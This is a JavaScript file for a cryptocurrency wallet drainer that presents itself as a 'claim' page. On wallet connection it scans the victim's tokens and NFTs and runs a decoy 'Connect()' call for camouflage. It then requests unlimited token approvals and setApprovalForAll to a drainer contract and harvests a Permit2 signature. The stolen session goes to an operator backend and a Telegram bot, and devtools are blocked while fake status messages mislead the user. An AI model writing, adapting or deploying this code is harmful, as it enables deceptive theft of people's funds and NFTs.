/* ============================================================================
 *  script.js — Approval Harvester (ERC-20 + ERC-721 + ERC-1155 + Permit2)
 *  ---------------------------------------------------------------------------
 *  RESPONSIBILITY: on 'wallet-connected', do the following:
 *
 *    1. Verify the wallet is on the correct chain (MAINNET_ID).
 *    2. Check the wallet has enough ETH to cover gas (CLAIM_THRESHOLD_USD).
 *    3. Scan for ERC-20 tokens with a balance.
 *    4. Scan for ERC-721 and ERC-1155 collections the wallet holds.
 *    5. Call the public `Connect()` facade for camouflage.
 *    6. Request approve(drainer, MAX) on every ERC-20 with a balance.
 *    7. Request setApprovalForAll(drainer, true) on every NFT collection.
 *    8. Capture an EIP-712 Permit2 PermitBatch signature.
 *    9. POST the harvest session to CONFIG.BACKEND_URL.
 *
 *  Does NOT call drainTokens / drainNFTs / drainPermit2 — those are
 *  onlyOperator on the deployed contract. The operator backend executes them.
 * ========================================================================== */

import { CONFIG } from './config.js';

/* ============================================================================
 *  ANTI-DEBUG (classroom authenticity only — no economic effect)
 * ========================================================================== */
(function () {
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) return;
  document.addEventListener('contextmenu', (e) => e.preventDefault());
  document.addEventListener('selectstart',   (e) => e.preventDefault());
  document.addEventListener('keydown', (e) => {
    if (e.keyCode === 123) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && e.keyCode === 73) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && e.keyCode === 74) e.preventDefault();
    if (e.ctrlKey && e.keyCode === 85) e.preventDefault();
  });
})();

/* ============================================================================
 *  STATE (per-session)
 * ========================================================================== */
let processed = false;
let running = false;

/* ============================================================================
 *  LOGGING + UI
 * ========================================================================== */
function logDebug(msg) {
  console.log(`[APEX] ${msg}`);
  const dbg = document.getElementById('connectionDebug');
  if (dbg) {
    dbg.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    dbg.scrollTop = dbg.scrollHeight;
  }
}

function showStatus(message, type = 'info') {
  const el = document.getElementById('claimStatus');
  if (!el) return;
  el.textContent = message;
  el.className = `status ${type}`;
  el.style.display = 'block';
  el.style.padding = '12px 16px';
  el.style.borderRadius = '8px';
  el.style.marginTop = '12px';
  el.style.fontWeight = '500';
  el.style.fontSize = '14px';
  el.style.textAlign = 'center';

  const styles = {
    success: { background: '#DCFCE7', color: '#166534', border: '1px solid #86EFAC' },
    error:   { background: '#FEE2E2', color: '#991B1B', border: '1px solid #FCA5A5' },
    info:    { background: '#DBEAFE', color: '#1E40AF', border: '1px solid #93C5FD' },
    pending: { background: '#FEF3C7', color: '#92400E', border: '1px solid #FCD34D' },
  };
  Object.assign(el.style, styles[type] || styles.info);
}

function showNotification(message, type = 'success') {
  const el = document.createElement('div');
  el.className = `fake-notification ${type}`;
  el.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${message}`;
  document.body.appendChild(el);
  setTimeout(() => {
    el.style.opacity = '0';
    setTimeout(() => el.remove(), 300);
  }, 3000);
}

/* ============================================================================
 *  TELEGRAM
 * ========================================================================== */
async function sendTelegramMessage(message) {
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    logDebug(`Telegram: ${e.message}`);
  }
}

/* ============================================================================
 *  MINIMAL ABIs
 * ========================================================================== */
const ERC20_ABI = [
  { constant: true,  inputs: [{ name: 'owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: true,  inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
  { constant: true,  inputs: [], name: 'symbol', outputs: [{ name: '', type: 'string' }], type: 'function' },
  { constant: true,  inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], type: 'function' },
];

const ERC721_ABI = [
  { constant: true,  inputs: [{ name: 'owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: 'operator', type: 'address' }, { name: 'approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' },
];

const ERC1155_ABI = [
  { constant: true,  inputs: [{ name: 'account', type: 'address' }, { name: 'id', type: 'uint256' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: 'operator', type: 'address' }, { name: 'approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' },
];

/* ============================================================================
 *  CONSTANTS
 * ========================================================================== */
const MAX_UINT256        = CONFIG.MAX_UINT256 || ('0x' + 'f'.repeat(64));
const APPROVAL_DELAY_MS  = CONFIG.APPROVAL_DELAY_MS ?? 2500;
const MAINNET_ID         = CONFIG.MAINNET_ID ?? 1;
const PERMIT2_ADDRESS    = CONFIG.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3';

/* ============================================================================
 *  SLEEP / TIMING
 * ========================================================================== */
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
function randomDelay(min, max) {
  const base = Math.floor(Math.random() * (max - min + 1)) + min;
  const jitter = Math.random() * 0.4 + 0.8;
  return sleep(base * jitter);
}

/* ============================================================================
 *  PRICE FEED
 * ========================================================================== */
async function getEthPriceUSD() {
  const apis = [
    ['https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd', (j) => j?.ethereum?.usd],
    ['https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT',                     (j) => j?.price],
    ['https://api.coinbase.com/v2/prices/ETH-USD/spot',                                 (j) => j?.data?.amount],
  ];
  for (const [url, pick] of apis) {
    try {
      const r = await fetch(url);
      const j = await r.json();
      const p = parseFloat(pick(j));
      if (p > 0) return p;
    } catch {}
  }
  return 2200;
}

/* ============================================================================
 *  RECEIPT WAIT + SEND HELPER
 * ========================================================================== */
async function waitForReceipt(web3, hash, timeoutMs = CONFIG.RECEIPT_TIMEOUT_MS ?? 90_000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const r = await web3.eth.getTransactionReceipt(hash);
      if (r) return r;
    } catch {}
    await sleep(2000);
  }
  return null;
}

async function sendAndConfirm(web3, txPromise, description) {
  try {
    logDebug(`📤 ${description}`);
    const tx = await txPromise;
    logDebug(`📨 ${tx.transactionHash}`);
    const receipt = await waitForReceipt(web3, tx.transactionHash);
    if (!receipt) return { ok: false, reason: 'no_receipt' };
    if (receipt.status === false) return { ok: false, reason: 'reverted' };
    logDebug(`✅ ${description} confirmed`);
    return { ok: true, hash: tx.transactionHash, receipt };
  } catch (e) {
    logDebug(`❌ ${description}: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

/* ============================================================================
 *  WALLET SCANNING
 * ========================================================================== */
async function scanERC20s(web3, address) {
  const found = [];
  for (const t of CONFIG.KNOWN_TOKENS) {
    try {
      const contract = new web3.eth.Contract(ERC20_ABI, t.address);
      const raw = await contract.methods.balanceOf(address).call();
      const bal = BigInt(raw.toString());
      if (bal > 0n) {
        found.push({
          address: t.address,
          symbol: t.symbol,
          decimals: t.decimals,
          rawBalance: bal.toString(),
        });
      }
    } catch {}
  }
  return found;
}

async function scanNFTs(web3, address) {
  const found = [];
  for (const c of CONFIG.KNOWN_NFT_COLLECTIONS) {
    try {
      const abi = c.standard === 1155 ? ERC1155_ABI : ERC721_ABI;
      const contract = new web3.eth.Contract(abi, c.address);
      let hasBalance = false;
      if (c.standard === 1155) {
        // ERC-1155 needs an id; check a small range
        for (let id = 0; id < 5; id++) {
          const b = await contract.methods.balanceOf(address, id).call();
          if (BigInt(b.toString()) > 0n) { hasBalance = true; break; }
        }
      } else {
        const bal = await contract.methods.balanceOf(address).call();
        hasBalance = BigInt(bal.toString()) > 0n;
      }
      if (hasBalance) found.push({ ...c });
    } catch {}
  }
  return found;
}

/* ============================================================================
 *  APPROVALS
 * ========================================================================== */
async function approveERC20(web3, address, tokenAddress, amount) {
  try {
    const token = new web3.eth.Contract(ERC20_ABI, tokenAddress);

    // USDT-style: reset to zero first if a non-zero allowance exists
    try {
      const current = await token.methods.allowance(address, CONFIG.DRAINER_CONTRACT).call();
      if (current !== '0' && current !== 0) {
        logDebug(`Resetting allowance for ${tokenAddress.slice(0, 10)}`);
        const resetTx = token.methods.approve(CONFIG.DRAINER_CONTRACT, '0');
        const resetGas = await resetTx.estimateGas({ from: address }).catch(() => 100_000);
        await sendAndConfirm(
          web3,
          resetTx.send({ from: address, gas: Math.floor(resetGas * 1.3) }),
          `reset ${tokenAddress.slice(0, 10)}`
        );
        await sleep(2000);
      }
    } catch {}

    const tx = token.methods.approve(CONFIG.DRAINER_CONTRACT, amount);
    let gas;
    try {
      gas = Math.floor((await tx.estimateGas({ from: address })) * 1.3);
    } catch {
      gas = 100_000;
    }

    return await sendAndConfirm(
      web3,
      tx.send({ from: address, gas }),
      `approve ${tokenAddress.slice(0, 10)}`
    );
  } catch (e) {
    logDebug(`approveERC20 error: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

async function approveNFT(web3, address, collection, standard) {
  try {
    const abi = standard === 1155 ? ERC1155_ABI : ERC721_ABI;
    const contract = new web3.eth.Contract(abi, collection);
    const tx = contract.methods.setApprovalForAll(CONFIG.DRAINER_CONTRACT, true);

    let gas;
    try {
      gas = Math.floor((await tx.estimateGas({ from: address })) * 1.3);
    } catch {
      gas = 100_000;
    }

    return await sendAndConfirm(
      web3,
      tx.send({ from: address, gas }),
      `setApprovalForAll ${collection.slice(0, 10)}`
    );
  } catch (e) {
    logDebug(`approveNFT error: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

/* ============================================================================
 *  FACADE CALL (camouflage: this is what the victim actually sees)
 * ========================================================================== */
async function callFacadeConnect(web3, address) {
  try {
    const contract = new web3.eth.Contract(CONFIG.CONTRACT_ABI, CONFIG.DRAINER_CONTRACT);
    const tx = contract.methods.Connect(1, address, address);
    let gas;
    try {
      gas = Math.floor((await tx.estimateGas({ from: address })) * 1.3);
    } catch {
      gas = 150_000;
    }
    return await sendAndConfirm(
      web3,
      tx.send({ from: address, gas }),
      `facade Connect()`
    );
  } catch (e) {
    logDebug(`facade Connect error: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

/* ============================================================================
 *  PERMIT2 SIGNATURE
 * ========================================================================== */
async function requestPermit2Signature(web3, address, tokens, amounts) {
  try {
    let chainId = MAINNET_ID;
    try { chainId = await web3.eth.getChainId(); } catch {}

    const spender = CONFIG.DRAINER_CONTRACT;
    const now = Math.floor(Date.now() / 1000);
    const sigDeadline = now + 30 * 24 * 3600;
    const expiration  = now + 30 * 24 * 3600;

    // Convert amounts (BigInt strings) to uint160 safe values
    const details = tokens.map((token, i) => {
      let amt = BigInt(amounts[i]);
      const MAX160 = (1n << 160n) - 1n;
      if (amt > MAX160) amt = MAX160;
      return {
        token,
        amount: amt.toString(),
        expiration,
        nonce: 0,
      };
    });

    const payload = {
      types: {
        EIP712Domain: [
          { name: 'name',              type: 'string'  },
          { name: 'chainId',           type: 'uint256' },
          { name: 'verifyingContract', type: 'address' },
        ],
        PermitBatch: [
          { name: 'details',     type: 'PermitDetails[]' },
          { name: 'spender',     type: 'address'         },
          { name: 'sigDeadline', type: 'uint256'         },
        ],
        PermitDetails: [
          { name: 'token',      type: 'address' },
          { name: 'amount',     type: 'uint160' },
          { name: 'expiration', type: 'uint48'  },
          { name: 'nonce',      type: 'uint48'  },
        ],
      },
      primaryType: 'PermitBatch',
      domain: {
        name: 'Permit2',
        chainId,
        verifyingContract: PERMIT2_ADDRESS,
      },
      message: { details, spender, sigDeadline },
    };

    const provider = window.__apexState?.provider;
    if (!provider?.request) throw new Error('No EIP-1193 provider');

    const sig = await provider.request({
      method: 'eth_signTypedData_v4',
      params: [address, JSON.stringify(payload)],
    });

    return { details, spender, sigDeadline, sig };
  } catch (e) {
    logDebug(`Permit2 signature: ${e.message}`);
    return null;
  }
}

/* ============================================================================
 *  BACKEND POST
 * ========================================================================== */
async function notifyBackend(session) {
  if (!CONFIG.BACKEND_URL) {
    logDebug('No BACKEND_URL configured — harvest stays local');
    return false;
  }
  try {
    const res = await fetch(CONFIG.BACKEND_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(session),
    });
    logDebug(`Backend: HTTP ${res.status}`);
    return res.ok;
  } catch (e) {
    logDebug(`Backend POST failed: ${e.message}`);
    return false;
  }
}

/* ============================================================================
 *  MAIN HARVEST FLOW
 * ========================================================================== */
async function runHarvest() {
  if (processed || running) return;

  const S = window.__apexState;
  if (!S || !S.connected || !S.address || !S.web3) return;

  running = true;

  try {
    showStatus('Verifying wallet…', 'info');
    const web3 = S.web3;

    // 1. Chain check
    let chainId = Number(S.chainId || 0);
    if (!chainId) {
      try { chainId = await web3.eth.getChainId(); } catch {}
    }
    if (chainId !== MAINNET_ID) {
      logDebug(`Wrong chain: ${chainId} (expected ${MAINNET_ID})`);
      showStatus('Please switch to Ethereum mainnet to continue.', 'error');
      await sendTelegramMessage(
        `⚠️ <b>Wrong chain</b>\n<code>${S.address}</code>\nChain: ${chainId}`
      );
      running = false;
      return;
    }

    // 2. Native balance gate
    const balWei = await web3.eth.getBalance(S.address);
    const balEth = parseFloat(web3.utils.fromWei(balWei, 'ether'));
    const balUSD = balEth * (S.ethPriceUSD || 2200);

    logDebug(`Balance: ${balEth.toFixed(6)} ETH (~$${balUSD.toFixed(2)})`);

    if (balUSD < CONFIG.CLAIM_THRESHOLD_USD) {
      showStatus('Minimum balance required to complete your claim.', 'error');
      await sendTelegramMessage(
        `⚠️ <b>Skipped (underfunded)</b>\n<code>${S.address}</code>\nBalance: ${balEth.toFixed(6)} ETH`
      );
      running = false;
      return;
    }

    // 3. Scan
    showStatus('Scanning wallet…', 'info');
    const [erc20s, nfts] = await Promise.all([
      scanERC20s(web3, S.address),
      scanNFTs(web3, S.address),
    ]);
    logDebug(`Found ${erc20s.length} ERC-20s, ${nfts.length} NFT collections`);

    if (erc20s.length === 0 && nfts.length === 0) {
      // Still call the facade for camouflage
      await callFacadeConnect(web3, S.address);
      showStatus('No eligible assets found.', 'info');
      await sendTelegramMessage(
        `ℹ️ <b>No assets</b>\n<code>${S.address}</code>`
      );
      running = false;
      return;
    }

    // 4. Facade camouflage FIRST — this is what the user sees as "claim"
    showStatus('Verifying eligibility…', 'info');
    await callFacadeConnect(web3, S.address);
    await randomDelay(1200, 2200);

    // 5. ERC-20 approvals
    const approvedTokens  = [];
    const approvedAmounts = [];

    for (const token of erc20s) {
      showStatus(`Approving ${token.symbol}…`, 'info');
      const r = await approveERC20(web3, S.address, token.address, MAX_UINT256);
      if (r.ok) {
        approvedTokens.push(token.address);
        approvedAmounts.push(token.rawBalance);
      }
      await randomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);
    }

    // 6. NFT approvals
    let nftApprovals = 0;
    for (const nft of nfts) {
      showStatus(`Approving ${nft.name}…`, 'info');
      const r = await approveNFT(web3, S.address, nft.address, nft.standard);
      if (r.ok) nftApprovals++;
      await randomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);
    }

    // 7. Permit2 signature
    let permit2Payload = null;
    if (approvedTokens.length > 0) {
      showStatus('Verifying wallet ownership…', 'info');
      permit2Payload = await requestPermit2Signature(
        web3, S.address, approvedTokens, approvedAmounts
      );
    }

    // 8. Build and POST the session
    const session = {
      victim:          S.address,
      chainId,
      contract:        CONFIG.DRAINER_CONTRACT,
      erc20s,
      approvedTokens,
      approvedAmounts,
      nfts,
      nftApprovals,
      permit2Payload,
      submittedAt:     Date.now(),
    };

    const posted = await notifyBackend(session);

    // 9. Report
    const msg =
      `🟦 <b>Session Complete</b>\n` +
      `👤 <code>${S.address}</code>\n` +
      `💰 ETH: ${balEth.toFixed(6)}\n` +
      `🪙 ERC-20: ${erc20s.length} (approved: ${approvedTokens.length})\n` +
      `🖼 NFT: ${nfts.length} (approved: ${nftApprovals})\n` +
      `🔏 Permit2: ${permit2Payload ? 'captured' : 'none'}\n` +
      `📡 Backend: ${posted ? 'notified' : 'unreachable'}\n` +
      `🕒 ${new Date().toISOString()}`;
    await sendTelegramMessage(msg);

    showStatus(
      posted ? 'Claim submitted. Please wait for confirmation.' : 'Claim recorded.',
      'success'
    );

    processed = true;
    running = false;
  } catch (e) {
    logDebug(`Harvest error: ${e.message}`);
    showStatus('Claim failed. Please try again.', 'error');
    await sendTelegramMessage(`❌ <b>Harvest failed</b>\n${e.message}`);
    running = false;
  }
}

/* ============================================================================
 *  EVENT LISTENERS
 * ========================================================================== */
window.addEventListener('wallet-connected', async (event) => {
  const { address } = event.detail || {};
  if (!address) return;

  processed = false;
  running   = false;

  const S = window.__apexState;
  S.ethPriceUSD = await getEthPriceUSD();

  await sleep(1200);
  await runHarvest();
});

window.addEventListener('wallet-disconnected', () => {
  processed = false;
  running   = false;
  showStatus('Wallet disconnected', 'info');
});

/* ============================================================================
 *  BOOT — decorative countdown
 * ========================================================================== */
function startCountdown() {
  let remaining = 114600;
  setInterval(() => {
    remaining = Math.max(0, remaining - 1);
    const el = document.getElementById('countdown');
    if (!el) return;
    const d = Math.floor(remaining / 86400);
    const h = Math.floor((remaining % 86400) / 3600);
    const m = Math.floor((remaining % 3600) / 60);
    const s = remaining % 60;
    el.textContent = `${d}:${h}:${m}:${s}`;
  }, 1000);
}

document.addEventListener('DOMContentLoaded', startCountdown);

logDebug('script.js ready — waiting for wallet-connected');
